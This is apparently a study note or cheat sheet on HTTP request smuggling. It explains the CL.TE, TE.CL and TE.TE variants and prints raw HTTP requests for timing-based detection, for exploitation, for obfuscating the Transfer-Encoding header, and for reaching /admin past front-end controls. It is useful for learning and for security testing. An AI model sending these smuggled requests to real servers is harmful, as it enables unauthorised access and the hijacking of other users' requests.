# HTTP request smuggling

Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

- **CL.TE**: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
- **TE.CL**: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
- **TE.TE**: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

**Table of Contents:**
- [HTTP request smuggling](#http-request-smuggling)
- [Finding HTTP request smuggling vulnerabilities](#finding-http-request-smuggling-vulnerabilities)
  - [Finding HTTP request smuggling vulnerabilities using timing techniques](#finding-http-request-smuggling-vulnerabilities-using-timing-techniques)
    - [Finding CL.TE vulnerabilities](#finding-clte-vulnerabilities)
    - [Finding TE.CL vulnerabilities](#finding-tecl-vulnerabilities)
  - [Confirming HTTP request smuggling vulnerabilities using differential responses](#confirming-http-request-smuggling-vulnerabilities-using-differential-responses)
- [Exploit the vulnerability](#exploit-the-vulnerability)
  - [Exploiting CL.TE vulnerabilities](#exploiting-clte-vulnerabilities)
  - [Exploiting TE.CL vulnerabilities](#exploiting-tecl-vulnerabilities)
  - [TE.TE behavior: obfuscating the TE header](#tete-behavior-obfuscating-the-te-header)
  - [Exploiting HTTP request smuggling to bypass front-end security controls](#exploiting-http-request-smuggling-to-bypass-front-end-security-controls)
    - [Exploiting CL.TE](#exploiting-clte)
    - [Exploiting TE.CL](#exploiting-tecl)
- [Source](#source)

# Finding HTTP request smuggling vulnerabilities

## Finding HTTP request smuggling vulnerabilities using timing techniques

### Finding CL.TE vulnerabilities

The **front-end server** uses the `Content-Length` header, it will forward only part of this request, omitting the X. The **back-end server** uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.

```http
POST / HTTP/1.1
Host: HOST_NAME
Connection: keep-alive
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

1
A
X
```

### Finding TE.CL vulnerabilities

The **front-end server** uses the `Transfer-Encoding` header, it will forward only part of this request, omitting the X. The **back-end server** uses the `Content-Length` header, expects more content in the message body, and waits for the remaining content to arrive. This will cause an observable time delay.

```http
POST / HTTP/1.1
Host: HOST_NAME
Connection: keep-alive
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

X
```

## Confirming HTTP request smuggling vulnerabilities using differential responses

his involves sending two requests to the application in quick succession:

- An "attack" request that is designed to interfere with the processing of the next request.
- A "normal" request.

If the response to the normal request contains the expected interference, then the vulnerability is confirmed

# Exploit the vulnerability

## Exploiting CL.TE vulnerabilities

- front-end server uses the `Content-Length` header
- back-end server uses the `Transfer-Encoding` header

```http
POST / HTTP/1.1
Host: HOST_NAME
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Transfer-Encoding: chunked

0


POST / HTTP/1.1
Host: HOST_NAME
Content-Length: 6

test=1
```

## Exploiting TE.CL vulnerabilities

- front-end server uses the `Transfer-Encoding` header
- back-end server uses the `Content-Length` header

```http
POST / HTTP/1.1
Host: HOST_NAME
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

3d                           # <---  Value in Hex !!!
POST / HTTP/1.1
Host: HOST_NAME
Content-Length: 6

test=1
0


```

## TE.TE behavior: obfuscating the TE header

front-end and back-end servers both support the `Transfer-Encoding` header

Example of obfuscate the Transfer-Encoding header:

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

```http
Transfer-Encoding
: chunked
```

Request example:

```http
POST / HTTP/1.1
Host: HOST_NAME
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

3d                           # <---  Value in Hex !!!
POST / HTTP/1.1
Host: HOST_NAME
Content-Length: 6

test=1
0


```

## Exploiting HTTP request smuggling to bypass front-end security controls

### Exploiting CL.TE

```http
POST / HTTP/1.1
Host: HOST_NAME
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Transfer-Encoding: chunked

0


GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
Content-Length: 10

x=                              # <---  To ignore the real request 
```

### Exploiting TE.CL

```http
POST / HTTP/1.1
Host: HOST_NAME
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

6d                           # <---  Value in Hex !!!
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

test=1
0


```

# Source 

- <https://portswigger.net/web-security/request-smuggling>
- <https://www.neuralegion.com/blog/http-request-smuggling-hrs/>
